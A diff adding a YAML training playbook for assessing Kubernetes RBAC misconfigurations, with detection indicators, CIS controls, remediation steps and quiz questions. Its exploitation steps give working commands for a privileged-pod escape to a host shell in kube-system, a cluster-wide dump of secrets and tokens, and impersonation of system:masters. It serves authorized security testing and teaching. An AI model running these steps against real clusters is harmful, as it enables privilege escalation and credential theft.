@@ -1,0 +1,186 @@
+# Category: Cloud Security - Kubernetes Security
+name: "Kubernetes RBAC Misconfiguration Assessment"
+id: "cloud-k8s-rbac-001"
+category: "cloud_security"
+subcategory: "kubernetes_security"
+difficulty: "advanced"
+estimated_time: "90 minutes"
+
+description: |
+  Assess Kubernetes RBAC configurations for privilege escalation paths,
+  overly permissive roles, wildcard bindings, and cluster-admin abuse.
+  Covers manual enumeration and automated tools like kube-bench and rbac-tool.
+
+learning_objectives:
+  - Enumerate Kubernetes RBAC roles and bindings
+  - Identify privilege escalation paths via misconfigured RBAC
+  - Exploit wildcard permissions and cluster-admin bindings
+  - Harden RBAC with least-privilege role design
+
+tools:
+  - kubectl
+  - kube_bench
+  - rbac_tool
+  - rbac_police
+  - kubeaudit
+  - rakkess
+
+prerequisites:
+  - kubectl access to target cluster
+  - Understanding of Kubernetes RBAC model
+  - kubeconfig configured for target cluster
+  - Written authorization from cluster owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate cluster roles and bindings"
+    commands:
+      - "# List all ClusterRoles"
+      - "kubectl get clusterroles --all-namespaces"
+      - "kubectl get clusterrolebindings --all-namespaces"
+      - "# List namespace roles"
+      - "kubectl get roles --all-namespaces"
+      - "kubectl get rolebindings --all-namespaces"
+      - "# Find who has cluster-admin"
+      - "kubectl get clusterrolebindings -o json | python3 -c \"import sys,json; [print(b['metadata']['name'], [s.get('name','') for s in b.get('subjects',[])]) for b in json.load(sys.stdin)['items'] if b.get('roleRef',{}).get('name')=='cluster-admin']\""
+      - "# Check current user permissions"
+      - "kubectl auth can-i --list"
+      - "kubectl auth can-i --list --namespace=kube-system"
+    expected_output: "Full list of cluster roles, bindings, and cluster-admin subjects"
+    detection: "Kubernetes audit log: get/list on ClusterRoleBindings and ClusterRoles"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Identify dangerous permission patterns"
+    commands:
+      - "# Find wildcard permissions in roles"
+      - "kubectl get clusterroles -o json | python3 -c \"\nimport sys, json\nroles = json.load(sys.stdin)['items']\nfor r in roles:\n    for rule in r.get('rules', []):\n        if '*' in rule.get('verbs', []) or '*' in rule.get('resources', []):\n            print(f\\\"{r['metadata']['name']}: verbs={rule.get('verbs')} resources={rule.get('resources')}\\\")\n\""
+      - "# Find roles with secrets access"
+      - "kubectl get clusterroles -o json | python3 -c \"\nimport sys, json\nfor r in json.load(sys.stdin)['items']:\n    for rule in r.get('rules', []):\n        if 'secrets' in rule.get('resources', []) or '*' in rule.get('resources', []):\n            if any(v in rule.get('verbs', []) for v in ['get', 'list', '*']):\n                print(r['metadata']['name'])\n\""
+      - "# Find roles allowing pod exec (potential escape)"
+      - "kubectl get clusterroles -o json | python3 -c \"\nimport sys, json\nfor r in json.load(sys.stdin)['items']:\n    for rule in r.get('rules', []):\n        if 'pods/exec' in rule.get('resources', []) or '*' in rule.get('resources', []):\n            print(r['metadata']['name'])\n\""
+      - "# rakkess — show all permissions for current context"
+      - "kubectl rakkess 2>/dev/null || echo 'Install: kubectl krew install rakkess'"
+    expected_output: "Roles with wildcard permissions, secrets access, or pod exec privileges"
+    detection: "Kubernetes audit log: extensive get/list operations on Role/ClusterRole resources"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Escalate via wildcard pod creation (create pods in kube-system)"
+    commands:
+      - "# If role allows pods/* creation — deploy privileged pod for escape"
+      - "cat > /tmp/priv_pod.yaml << 'EOF'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: privesc-pod\n  namespace: kube-system\nspec:\n  hostPID: true\n  hostNetwork: true\n  hostIPC: true\n  containers:\n  - name: shell\n    image: ubuntu\n    command: [\"/bin/bash\", \"-c\", \"nsenter -t 1 -m -u -i -n -- bash\"]\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /host\n      name: host-root\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\nEOF"
+      - "kubectl apply -f /tmp/priv_pod.yaml"
+      - "kubectl exec -it privesc-pod -n kube-system -- nsenter -t 1 -m -u -i -n -- bash"
+    expected_output: "Host node shell via privileged pod creation in kube-system"
+    detection: "Kubernetes audit: privileged pod creation in kube-system namespace"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Read secrets cluster-wide (credential harvesting)"
+    commands:
+      - "# If role allows secrets list/get"
+      - "kubectl get secrets --all-namespaces"
+      - "# Read all service account tokens"
+      - "kubectl get secrets --all-namespaces -o json | python3 -c \"\nimport sys, json, base64\nsecrets = json.load(sys.stdin)['items']\nfor s in secrets:\n    if s.get('type') == 'kubernetes.io/service-account-token':\n        token = s.get('data', {}).get('token', '')\n        if token:\n            print(f\\\"{s['metadata']['namespace']}/{s['metadata']['name']}: {base64.b64decode(token).decode()[:100]}...\\\")\n\""
+      - "# Dump all secrets including app credentials"
+      - "for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do\n  kubectl get secrets -n $ns -o json | python3 -c \"import sys,json,base64; [print(f\\\"$ns/{s['metadata']['name']}: {list(s.get('data',{}).keys())}\\\") for s in json.load(sys.stdin)['items']]\"\ndone"
+    expected_output: "Service account tokens and application secrets from all namespaces"
+    detection: "Kubernetes audit: high-volume list/get secrets across namespaces"
+
+  - id: "step5"
+    phase: "enumeration"
+    action: "Automated RBAC assessment with kube-bench and rbac-tool"
+    commands:
+      - "# Run kube-bench for CIS benchmark"
+      - "kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml"
+      - "kubectl logs -f job/kube-bench"
+      - "# rbac-tool for visualization"
+      - "kubectl rbac-tool visualize 2>/dev/null || echo 'Install: kubectl krew install rbac-tool'"
+      - "kubectl rbac-tool who-can get secrets"
+      - "kubectl rbac-tool who-can create pods --namespace kube-system"
+      - "# rbac-police — identify risky RBAC configs"
+      - "git clone https://github.com/PaloAltoNetworks/rbac-police /opt/rbac-police"
+      - "python3 /opt/rbac-police/eval.py collect | python3 /opt/rbac-police/eval.py eval -"
+      - "# kubeaudit for broad RBAC and security checks"
+      - "kubeaudit all 2>/dev/null | grep -E 'WARN|ERROR' | head -30"
+    expected_output: "Automated RBAC risk assessment with specific findings and recommendations"
+    detection: "kube-bench pod creation in default namespace; RBAC tool API calls"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Impersonate higher-privilege users"
+    commands:
+      - "# Check if impersonation is allowed"
+      - "kubectl auth can-i impersonate users"
+      - "kubectl auth can-i impersonate serviceaccounts"
+      - "# If impersonation allowed — act as system:masters"
+      - "kubectl --as=system:admin get nodes"
+      - "kubectl --as=system:admin --as-group=system:masters get secrets --all-namespaces"
+      - "# Check specific user permissions"
+      - "kubectl auth can-i --list --as=[target_user]"
+      - "kubectl auth can-i --list --as=system:serviceaccount:kube-system:default"
+    expected_output: "Impersonation of privileged users enabling cluster-wide access"
+    detection: "Kubernetes audit: impersonate verb usage in API calls"
+
+compliance_controls:
+  - standard: "CIS Kubernetes Benchmark v1.8"
+    control: "5.1.1"
+    description: "Ensure cluster-admin role is only used where required"
+  - standard: "CIS Kubernetes Benchmark v1.8"
+    control: "5.1.3"
+    description: "Minimize wildcard use in Roles and ClusterRoles"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-6"
+    description: "Least privilege"
+  - standard: "PCI DSS v4.0"
+    control: "7.2.1"
+    description: "Access to system components appropriately assigned"
+
+detection:
+  network_indicators:
+    - "High volume of Kubernetes API calls to RBAC endpoints"
+    - "Unusual cross-namespace API calls from service accounts"
+  log_indicators:
+    - "Kubernetes audit: list/get secrets across all namespaces"
+    - "Kubernetes audit: privileged pod creation in kube-system"
+    - "Kubernetes audit: impersonate verb used"
+    - "Falco: K8s secret dumped"
+  endpoint_indicators:
+    - "kube-bench or rbac-tool execution in cluster"
+    - "New privileged pods in kube-system namespace"
+
+remediation:
+  immediate:
+    - "Remove cluster-admin bindings from non-essential service accounts"
+    - "Replace wildcard rules with specific resource/verb permissions"
+    - "Restrict pod exec permissions to dev/debug namespaces only"
+    - "Audit and remove secrets list permissions from non-admin roles"
+  long_term:
+    - "Implement OPA/Gatekeeper to enforce RBAC policies"
+    - "Deploy rbac-police in CI/CD to catch RBAC regressions"
+    - "Adopt namespace-scoped roles over ClusterRoles where possible"
+    - "Implement periodic RBAC reviews using rbac-tool and kube-bench"
+
+variables:
+  kubeconfig: "~/.kube/config"
+  target_namespace: "production"
+  target_user: "developer@example.com"
+
+assessment_questions:
+  - "What is the difference between a Role and a ClusterRole in Kubernetes?"
+  - "Why is pods/exec permission dangerous and equivalent to remote code execution?"
+  - "How does wildcard resource permission in a ClusterRole enable privilege escalation?"
+  - "What CIS Kubernetes Benchmark control governs cluster-admin usage?"
+  - "How does kubectl impersonate work and what RBAC permission enables it?"
+
+references:
+  - url: "https://github.com/aquasecurity/kube-bench"
+    title: "kube-bench CIS Kubernetes Benchmark"
+  - url: "https://github.com/PaloAltoNetworks/rbac-police"
+    title: "rbac-police - Kubernetes RBAC Risk Assessment"
+  - url: "https://kubernetes.io/docs/reference/access-authn-authz/rbac/"
+    title: "Kubernetes RBAC Documentation"
+  - url: "https://github.com/cyberark/kubernetes-rbac-audit"
+    title: "CyberArk Kubernetes RBAC Audit"
